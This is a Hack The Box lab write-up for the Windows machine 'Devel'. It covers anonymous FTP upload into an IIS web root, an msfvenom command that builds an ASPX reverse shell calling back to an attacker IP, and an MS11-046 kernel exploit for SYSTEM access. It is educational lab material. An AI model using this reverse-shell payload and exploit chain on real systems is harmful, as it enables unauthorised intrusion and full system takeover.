---
title: "HTB: Devel"
tags: [htb, windows, easy, ftp, iis, kernel-exploit, manual]

description: "The classic 'FTP Upload -> IIS Execute' path, followed by a Kernel exploit for System."
---

# Hack The Box: Devel

**Machine IP**: `10.10.10.5`
**OS**: Windows 7
**Difficulty**: Easy

Devel is the "Standard Operating Procedure" for IIS servers.

## 1. Reconnaissance
Nmap shows:
*   **21 (FTP)**: Anonymous Allowed.
*   **80 (HTTP)**: Microsoft IIS 7.5.

We check if the FTP root is the same as the Web root.
1.  Upload `test.html` via FTP.
2.  Visit `http://10.10.10.5/test.html`.
3.  **Success**: It renders. We have Write Access to the Web Root.

## 2. Exploitation (Web Shell)
We generate an ASPX payload with `msfvenom`.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f aspx > shell.aspx
```
Upload it via FTP.
Trigger it via curl.
We get a shell as `iis apppool\web`.

## 3. Privilege Escalation (Kernel)
We run `systeminfo`.
OS Name: `Microsoft Windows 7 Enterprise`.
Patch Level: Ancient.

We use **Sherlock.ps1** or **Watson.exe** to find missing patches.
It is vulnerable to **MS11-046** (afd.sys).
We compile the exploit (`40564.c`) to `exploit.exe`.
Upload -> Run.
`exploit.exe` spawns a new shell as `System`.

## Conclusion
Never let Anonymous FTP map to an executable web directory.
